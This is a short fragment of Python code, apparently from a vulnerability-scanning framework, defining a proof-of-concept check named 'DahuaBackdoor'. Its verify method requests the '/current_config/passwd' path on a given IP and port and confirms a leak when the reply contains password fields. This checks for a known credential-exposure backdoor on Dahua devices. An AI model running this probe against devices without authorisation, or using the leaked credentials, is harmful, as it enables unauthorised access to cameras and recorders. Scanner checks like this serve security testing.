...
class DahuaBackdoor(POCTemplate):
    ...
    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/current_config/passwd"
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('Password' in r.text) and ('Sharable' in r.text):
...
POCTemplate.register_poc(DahuaBackdoor)
